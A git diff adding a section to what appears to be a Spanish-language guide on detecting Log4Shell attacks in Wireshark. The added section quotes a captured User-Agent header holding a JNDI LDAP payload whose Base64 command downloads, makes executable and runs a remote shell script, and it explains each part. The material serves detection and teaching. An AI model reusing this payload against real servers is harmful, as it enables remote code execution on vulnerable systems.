@@ -33,3 +33,33 @@ Utilizar ip contains jndi como filtro en Wireshark permite detectar paquetes que
 
 Este filtro sólo funcionará en un ataque al puerto 80 or open web. Pero no funcionará si se ataca el puerto 443 o una conexión TLS, ya que no podemos ver el texto en claro.
 
+
+
+![](capturas/wireshark-http-analysis.png)
+
+
+
+## Ejemplo de captura del tráfico de un ataque Log4j
+```
+User-Agent: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}\r\n
+
+- User-Agent: Este es el campo del encabezado HTTP que normalmente indica qué navegador o cliente HTTP está haciendo la solicitud.
+- ${jndi:ldap://...}: Esta es la parte crítica que explota la vulnerabilidad Log4Shell (CVE-2021-44228) en Log4j. Permite la ejecución remota de código a través de la inyección de una cadena maliciosa.
+  - jndi: Java Naming and Directory Interface, una API de Java para servicios de directorio que permite a las aplicaciones Java descubrir y obtener datos o recursos usando un nombre.
+  - ldap: Lightweight Directory Access Protocol, un protocolo para acceder y mantener servicios de directorio distribuidos.
+  
+- ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==: Esta URL LDAP apunta a un servidor controlado por el atacante (45.137.21.9 en el puerto 1389). El path que sigue especifica un comando codificado en Base64 que el servidor vulnerable intentará ejecutar.
+
+- d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==: Este es el comando codificado en Base64. Decodificado, se traduce a una secuencia de comandos shell que realiza lo siguiente:
+  - Descarga un script (probablemente malicioso) de http://62.210.130.250/lh.sh.
+  - Cambia los permisos del script descargado para hacerlo ejecutable (chmod +x lh.sh).
+  - Ejecuta el script descargado (./lh.sh).
+```
+
+
+### Analizamos la web que nos aparece con Virustotal
+IP: 62.210.130.250
+![](capturas/virustotal.png)
+
+
+
